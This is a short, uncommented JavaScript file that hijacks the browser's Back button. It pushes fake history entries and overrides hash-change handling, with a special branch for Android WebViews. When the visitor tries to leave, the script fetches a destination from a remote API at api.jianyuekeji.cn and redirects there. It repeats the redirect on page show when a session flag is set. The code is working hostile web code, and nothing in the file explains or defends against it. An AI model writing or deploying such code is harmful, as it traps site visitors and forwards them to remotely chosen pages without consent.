window.onpageshow = function() {
    sessionStorage.getItem('jumpOut') && a();
}

function a() {
    window.fetch('https://api.jianyuekeji.cn/api/getDomain/5861_a42ft9xj8jbb4e6w').then(function(res) {
        return res.json();
    }).then(function(data) {
        location.href = data.url;
    })
}

function ntzgo() {
    history.pushState(history.length + 1, "message", window.location.href.split("#")[0] + "#" + new Date()
        .getTime());
    if (navigator.userAgent.indexOf("Android") != -1) {
        if (typeof(tbsJs) != "undefined") {
            tbsJs.onReady("{useCachedApi : 'true'}", function(e) {});
            window.onhashchange = function() {
                window.history.pushState("forward", null, "#");
                window.history.forward(1);
                a()
            }
        } else {
            var pop = 0;
            window.onhashchange = function(event) {
                pop++;
                if (pop >= 3) {
                    a()
                } else {
                    history.go(1)
                }
            };
            history.go(-1)
        }
    } else {
        window.onhashchange = function() {
            a()
        }
    }
};

ntzgo();